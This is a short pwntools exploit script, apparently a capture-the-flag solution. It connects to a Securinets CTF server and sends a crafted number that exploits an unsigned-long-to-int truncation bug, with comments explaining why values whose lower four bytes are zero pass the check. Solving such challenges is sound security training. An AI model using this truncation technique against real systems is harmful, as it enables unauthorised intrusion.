from pwn import *

p = remote("pwn.ctf.securinets.tn", 8686)

# We are casting an unsigned long to an int
# Unsigned long is 8 bytes: 0x1122334455667788
# Int is 4 bytes:
# When doing the function call, it'll simply take the lower 4 bytes of the number
# So any unsigned long that have it's 4 lower bytes 0 will work:
# 0x100000000, 0x200000000, 0x300000000....
p.sendline(str(0xbeef00000000).encode())

p.interactive()
